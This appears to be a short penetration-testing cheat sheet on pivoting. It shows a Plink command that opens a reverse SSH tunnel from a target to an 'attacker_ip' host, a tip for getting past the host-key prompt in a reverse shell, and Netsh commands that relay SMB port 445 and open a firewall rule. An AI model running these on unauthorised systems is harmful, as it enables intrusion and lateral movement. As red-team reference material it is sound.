# Port Forwarding & Tunneling

## Port Forwarding

### Plink

Source: [http://the.earth.li/\~sgtatham/putty/0.53b/htmldoc/Chapter7.html](http://the.earth.li/\~sgtatham/putty/0.53b/htmldoc/Chapter7.html)

Remote port forwarding, setup from target:

```
plink.exe -ssh -l kali -pw ilak -R attacker_ip:attacker_port:127.0.0.1:target_port attacker_ip
```

{% hint style="info" %}
When doing a first connection to a host, plink will ask whether to cache the host key or not. This step may not be seen in a typical reverse shell.

To avoid the interaction, pipe an "`echo y"`: `cmd /c echo y | plink.exe ...`
{% endhint %}

### Netsh

High privilege shell required.

Local port forwarding, setup from relay:

```
netsh interface portproxy add v4tov4 listenport=8888 listenaddress=relay_ip connectport=445 connectaddress=target_ip

# Configuring corresponding Windows firewall rule
netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=relay_ip localport=8888 action=allow
```
